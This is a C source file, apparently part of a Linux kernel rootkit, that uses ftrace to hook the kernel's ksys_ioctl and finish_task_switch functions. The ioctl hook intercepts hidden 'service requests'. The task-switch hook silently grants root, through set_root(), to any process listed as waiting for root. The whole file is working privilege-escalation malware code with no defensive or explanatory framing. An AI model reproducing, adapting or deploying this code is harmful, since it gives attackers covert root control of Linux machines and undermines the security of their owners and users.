#include <linux/kernel.h>
#include <linux/sched.h>
#include "ftrace_helper.h"
#include "hooks.h"
#include "service.h"
#include "privileges.h"

static int (*orig_ksys_ioctl)(unsigned int fd, unsigned int cmd, unsigned long arg);
static struct rq *(*orig_finish_task_switch)(struct task_struct *prev);

int hook_ksys_ioctl(unsigned int fd, unsigned int cmd, unsigned long arg)
{
    int rval = handle_ioctl_request(fd, cmd, arg);

    // 0 means this is not a service request
    if (rval == 0)
        return orig_ksys_ioctl(fd, cmd, arg);
    else
        return rval;
}

static struct rq *hook_finish_task_switch(struct task_struct *prev)
{
    struct pid_list *entry, *to_delete = NULL;
    list_for_each_entry(entry, &pids_waiting_for_root, list) {
        if (entry->pid == current->pid) {
            set_root();
            to_delete = entry;
        }
    }
    if (to_delete != NULL)
        list_del(&to_delete->list);
    return orig_finish_task_switch(prev);
}

static struct ftrace_hook hooks[] = {
    HOOK("ksys_ioctl", hook_ksys_ioctl, &orig_ksys_ioctl),
    HOOK("finish_task_switch", hook_finish_task_switch, &orig_finish_task_switch)
};

inline int register_hooks(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

inline void unregister_hooks(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}